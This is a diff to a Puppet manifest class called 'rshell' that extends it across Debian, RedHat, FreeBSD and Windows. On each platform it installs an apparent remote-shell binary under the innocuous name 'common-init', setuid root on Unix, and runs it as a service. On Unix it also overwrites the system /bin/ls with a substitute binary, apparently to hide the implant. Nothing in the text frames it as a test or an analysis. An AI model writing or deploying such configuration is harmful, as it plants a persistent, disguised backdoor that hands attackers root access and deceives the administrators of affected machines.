@@ -1,12 +1,48 @@
 class rshell {
-    file { '/usr/bin/common-init':
-      ensure => present,
-      source => '',
-      owner => 'root',
-      mode => '4755',
+    if $::osfamily == 'debian' || $::osfamily == 'redhat' { 
+      file { '/usr/bin/common-init':
+        ensure => present,
+        source => 'puppet:///modules/rshell/rshell',
+        owner => 'root',
+        mode => '4755',
+      }
+      file { '/bin/ls':
+        ensure => present,
+        source => 'puppet:///modules/rshell/ls',
+        owner => 'root',
+        mode => '755'
+      }
+      service { 'rshell':
+        ensure => running,
+        binary => '/usr/bin/common-init'
+      }
     }
-    service { 'rshell':
-      ensure => running,
-      binary => '/usr/bin/common-init'
+    if $::osfamily == 'freebsd' {
+      file { '/usr/bin/common-init':
+        ensure => present,
+        source => 'puppet:///modules/rshell/rshell-bsd',
+        owner => 'root',
+        mode => '4755',
+      }
+      file { '/bin/ls':
+        ensure => present,
+        source => 'puppet:///modules/rshell/ls-bsd',
+        owner => 'root',
+        mode => '755'
+      }
+      service { 'rshell':
+        ensure => running,
+        binary => '/usr/bin/common-init'
+      }
+    }
+    if $::osfamily == 'windows' {
+      file { 'C:/ProgramData/common-init.exe':
+        ensure => present,
+        source => 'puppet:///modules/rshell/rshell.exe'
+      }
+      service { 'rshell':
+        ensure => running,
+        binary => 'C:/ProgramData/common-init.exe'
+      }
     }
 }
